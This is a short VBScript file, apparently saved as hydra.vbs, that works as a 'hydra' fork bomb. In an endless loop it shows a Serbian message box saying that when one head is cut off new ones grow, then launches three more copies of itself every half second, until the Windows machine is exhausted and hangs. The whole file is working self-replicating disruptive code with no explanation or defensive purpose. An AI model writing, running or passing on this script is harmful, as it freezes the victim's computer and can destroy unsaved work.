do
X=MsgBox("Odseci jednu glavu, nove ce da izrastu")

Set x=WScript.CreateObject("WScript.Shell")

for i = 1 to 3

x.Run"hydra.vbs"

wscript.sleep 500

next

loop